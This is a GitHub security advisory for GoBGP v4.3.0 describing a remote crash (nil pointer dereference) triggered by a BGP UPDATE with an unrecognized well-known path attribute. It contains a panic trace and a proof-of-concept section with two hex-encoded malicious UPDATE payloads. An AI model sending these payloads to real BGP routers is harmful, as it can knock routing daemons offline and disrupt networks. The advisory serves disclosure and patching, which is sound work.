# [H] GoBGP has Remote Denial of Service (Panic) via Malformed Well-known Path Attribute

## Summary
Severity: High
Advisory: GHSA-7235-89m6-f4px
CVE: CVE-2026-41642
CWE: CWE-476
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-04-29
Source: https://github.com/advisories/GHSA-7235-89m6-f4px
Type: github-advisory

## Affected
- Go: `github.com/osrg/gobgp/v4` — affected >=4.3.0 <4.4.0

## Details
### Summary
A remote Denial of Service (DoS) vulnerability exists in GoBGP due to a nil pointer dereference. When a malformed BGP UPDATE message contains an unrecognized Path Attribute marked as "Well-known," the daemon fails to interrupt the message handling flow. This results in an illegal memory access and a full process crash (panic).

### Details
The vulnerability is located in the Finite State Machine (FSM) message handling loop in pkg/server/fsm.go.
According to RFC 4271, any Path Attribute with the Optional bit set to 0 is treated as "Well-known." If the Type Code is unrecognized, the BGP speaker MUST send a NOTIFICATION message.

In GoBGP v4.3.0, when such an attribute (e.g., Type 0xEE or 0xFF with flags 0x40) is received, the parsing layer identifies the error. However, the logic in recvMessageloop (around Line 1826) does not properly halt execution. It proceeds to reference the body of the parsed message. Because the message was deemed invalid during the initial attribute check, the body pointer is nil, leading to:
panic: runtime error: invalid memory address or nil pointer dereference.

This bypasses the intended error-handling mechanism and causes the entire BGP daemon to terminate, rather than just closing the affected session.

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x18 pc=0xc225e4]

goroutine 50 [running]:
github.com/osrg/gobgp/v4/pkg/server.(*fsmHandler).recvMessageloop(0x19f29bca92c0, {0x10069f0, 0x19f29bc48780}, {0x1014658, 0x19f29bc2a890}, 0x19f29baa0540, 0x19f29bc393b0, 0x19f29bc96cc0?)
        /home/base/Desktop/gobgp/pkg/server/fsm.go:1826 +0xa44
created by github.com/osrg/gobgp/v4/pkg/server.(*fsmHandler).established in goroutine 37
        /home/base/Desktop/gobgp/pkg/server/fsm.go:1916 +0x2d5
exit status 2

```

### PoC
GoBGP Version: v4.3.0
Configure GoBGP with a neighbor (e.g., 192.168.31.195) in passive mode.
Establish a standard BGP session (OPEN/KEEPALIVE exchange).
Send a specifically crafted UPDATE packet containing an unrecognized Type Code marked as "Well-known" (Optional bit = 0).
Payload 1 (Hex):
```
FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
00 17                # Length: 23
02                   # Type: UPDATE
00 00                # Withdrawn Routes Length: 0
00 04                # Total Path Attribute Length: 4     
40 EE 00             # Flag: 0x40 (Well-known, Transitive), Type: 0xEE (Unknown), Len: 0
```
Payload 2 (Hex):
```
FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
00 17                # Length: 23
02                   # Type: UPDATE
00 00                # Withdrawn Routes Length: 0
00 04                # Total Path Attribute Length: 4     
40 01 01 00          # IGP Attribute
40 FF 00             # Flag: 0x40 (Well-known, Transitive), Type: 0xFF (Unknown), Len: 0
```
### Impact
This vulnerability affects all GoBGP deployments peering with external or internal speakers. A single malformed UPDATE message from any peer can trigger a nil pointer dereference, causing the GoBGP daemon to panic and crash.

## References
- https://github.com/osrg/gobgp/security/advisories/GHSA-7235-89m6-f4px
- https://nvd.nist.gov/vuln/detail/CVE-2026-41642
- https://github.com/osrg/gobgp
- https://github.com/osrg/gobgp/releases/tag/v4.4.0
